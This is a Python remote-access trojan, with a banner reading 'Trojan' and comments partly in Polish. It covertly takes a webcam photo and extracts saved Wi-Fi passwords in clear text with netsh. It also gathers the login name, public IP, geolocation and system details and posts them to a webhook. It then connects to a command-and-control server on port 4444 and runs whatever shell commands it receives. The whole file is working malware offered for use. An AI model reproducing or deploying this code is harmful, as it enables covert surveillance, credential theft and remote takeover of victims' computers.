import os
import subprocess
import cv2
import pyfiglet
import requests
import time
import os
import random
import argparse
from colored import fg, bg, attr, stylize
import platform
import psutil
import socket
import subprocess

#Server to send data
webhook_url = "" #Server name or ip
token = "" #Token to authorize to server/site

#IP finder
#https://ipstack.com/
api_key = "" #Your api key from site

#Date to send
text_to_send = "" 
previous_key =  ""

#Some flags
id = ''.join(random.choices('0123456789', k=10))
photo_taken = False

#C2
SERVER_IP = '127.0.0.1' 
PORT = 4444

#Dane
user_login = os.getlogin()
response = requests.get('https://api.ipify.org')
public_ip = response.text



def send_data():
	global token, text_to_send, id, photo_taken
	filepath = f"{id}.png"

	headers = {
		"Authorization": f"{token}",
		"Mode": "notification"
	}

	data = {
		"text": text_to_send
	}

	if photo_taken:
		with open(filepath, 'rb') as f:
			files = {
				'file': (f'{id}.png', f, 'image/png')
			}
			response = requests.post(webhook_url, headers=headers, data=data, files=files)
	else:
		response = requests.post(webhook_url, headers=headers, data=data)

	if response.status_code == 200:
		print("Send data:")
		print(stylize(response.text, fg("green")))
	else:
		print(stylize(f"Failed to get a valid response. Status code: {response.status_code}", fg("red")))


def get_ip_location(ip_address, api_key):
	url = f"http://api.ipstack.com/{ip_address}?access_key={api_key}"
	response = requests.get(url)

	if response.status_code == 200:
		location_data = response.json()
		# Wyciąganie informacji o lokalizacji
		city = location_data.get("city")
		country = location_data.get("country_name")
		latitude = location_data.get("latitude")
		longitude = location_data.get("longitude")

		return city, country, latitude, longitude
	else:
		print(f"Error: {response.status_code}")
		return None, None, None, None

def run_command(command):
    result = subprocess.run(command, capture_output=True, text=True, shell=True, encoding="utf-8", errors="ignore")
    return result.stdout.strip()

def get_profiles():
	output = run_command("netsh wlan show profiles")
	profiles = []
	for line in output.splitlines():
		if "All User Profile" in line:
			name = line.split(":")[1].strip()
			profiles.append(name)
	return profiles

def get_password(profile):
	output = run_command(f'netsh wlan show profile name="{profile}" key=clear')
	for line in output.splitlines():
		if "Key Content" in line:
			password = line.split(":")[1].strip()
	return password

def take_photo():
	global photo_taken
	try:
	    """
	    Takes and saves a photo
	    """
	    camera = cv2.VideoCapture(0)
	    _, image = camera.read()
	    cv2.imwrite(f'{id}.png', image)
	    del(camera)
	    print(stylize("Zrobiono zdjęcie", fg("green")))
	    photo_taken = True
	except:
		print(stylize("Nie można zrobić zdjęcia", fg("red")))
		photo_taken = False

def system_info_to_str(info: dict):
    return "\n".join([f"{key}: {value}" for key, value in info.items()])

def get_system_info():
    info = {
        "System": platform.system(),
        "Release": platform.release(),
        "Version": platform.version(),
        "Architecture": platform.architecture(),
        "Processor": platform.processor(),
        "CPU Cores": psutil.cpu_count(logical=False),
        "RAM (GB)": round(psutil.virtual_memory().total / (1024 ** 3), 2)
    }
    return system_info_to_str(info)

def main():
	ascii_banner = pyfiglet.figlet_format("Trojan")
	style = fg("red") + attr("bold")
	print(stylize(ascii_banner, style))

	take_photo()
	
	profiles = get_profiles()
	passwords = []
	for profile in profiles:
		passwords.append(get_password(profile))  
	
	os_info = get_system_info()

	try:
		city, country, lat, lng = get_ip_location(public_ip, api_key)

		if city and country:
			print(f"Lokalizacja IP {ip_address}:")
			print(f"Miasto: {city}, Kraj: {country}")
			print(f"Współrzędne: {lat}, {lng}")
			print(f"Link do google maps: https://www.google.com/maps/place/{lat}+{lng}")
		else:
			print(stylize("Nie udało się pobrać lokalizacji.",fg("red")))
	except:
		print(stylize("Coś poszło nie tak podczas pobierania danych. \nSpróbuj ponownie później", fg("red")))


	global text_to_send
	text_to_send = f"\n=== NEW USER ===\n\n=== IP related ===\nIP: {public_ip}\nCountry:{country}\nCity:{city}\n\n=== OS Info ===\nUser login: {user_login}\n{os_info}\n\n=== Web ===\nWeb:\n{profiles}\n{passwords}\n </div><div><img src='uploads/{id}.png' alt='No photo' style='width:450px;'>" 
	send_data()
	print(f"User: {user_login}\nIP: {public_ip} \n{os_info} \nKraj:{country}\nMiasto:{city}")
	print(f"Profile i hasła w sieci:\nProfil -> {profiles}\nPassword -> {passwords}")

	print("Connecting to server")
	client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	client.connect((SERVER_IP, PORT))
	print(stylize("Connected to server",fg("green")))
	while True:
	    command = client.recv(1024).decode()
	    if command.lower() == 'exit':
	        break
	    try:
	        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
	    except subprocess.CalledProcessError as e:
	        output = e.output
	    client.send(output or b"OK\n")

if __name__ == '__main__':
	main()
